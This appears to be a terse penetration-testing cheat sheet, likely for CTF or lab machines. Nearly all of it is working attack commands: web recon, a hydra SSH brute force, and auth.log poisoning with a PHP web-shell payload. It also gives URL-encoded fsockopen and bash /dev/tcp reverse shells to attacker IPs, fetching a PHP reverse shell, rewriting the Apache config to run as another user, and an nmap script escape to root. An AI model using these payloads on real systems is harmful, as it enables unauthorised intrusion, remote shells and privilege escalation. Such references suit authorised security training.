Web Penetration Methodology:
View Page
View Source (Ctrl+U)
http://xx.xx.xx.xx/robots.txt
nikto -host xx.xx.xx.xx
whatweb http://xx.xx.xx.xx
dirb http://xx.xx.xx.xx

Shell Upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'

List Sudo Privileges:
$ sudo -l
(lowercase L)

hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt 192.168.60.80 ssh -t 4

Poisoning the auth.log file:
If you can see the auth.log maybe you can poison it...
http://xx.xx.xx.xx/console/file.php?file=/var/log/auth.log
$ ssh '<?php system($_GET['cmd']); ?>'@xx.xx.xx.xx
...Encode this:
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
(Using https://www.urlencoder.org/)
...Converts to:
php%20-r%20%27%24sock%3Dfsockopen%28%22xx.xx.xx.xx%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
http://xx.xx.xx.xx/console/file.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.49.60%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Start Local Web Server on Kali:
$ python3 -m http.server 80

Using Curl to Download a PHP Shell:
$ curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php --output ~/php-reverse-shell.php

Wget from Attackers Machine:
wget http://xx.xx.xx.xx/shell.php

Restart the Apache Server Under a Different (More Privileged) User:
cp /etc/apache2/apache2.conf .
sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf
sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf
cp apache2.conf /etc/apache2/apache2.conf
sudo /bin/systemctl restart apache2

PHP Reverse Shell:
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"192.168.49.80"/1234 0>&1'");?>

Make a NMAP Script that Escapes Restrictive Shell:
[if NMAP can be run as another user]:
$ TF=$(mktemp) 
$ echo 'os.execute("/bin/sh")' > $TF
$ sudo -u root nmap --script=$TF
